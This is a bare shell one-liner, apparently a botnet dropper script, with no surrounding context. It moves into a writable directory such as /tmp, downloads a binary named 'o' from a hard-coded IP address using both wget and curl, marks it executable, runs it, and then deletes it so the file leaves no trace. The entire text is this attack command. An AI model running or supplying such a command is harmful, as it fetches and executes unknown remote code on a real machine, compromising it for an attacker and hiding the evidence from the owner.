cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.116/o; curl -O http://191.96.112.116/o; chmod +x o; ./o; rm -rf o
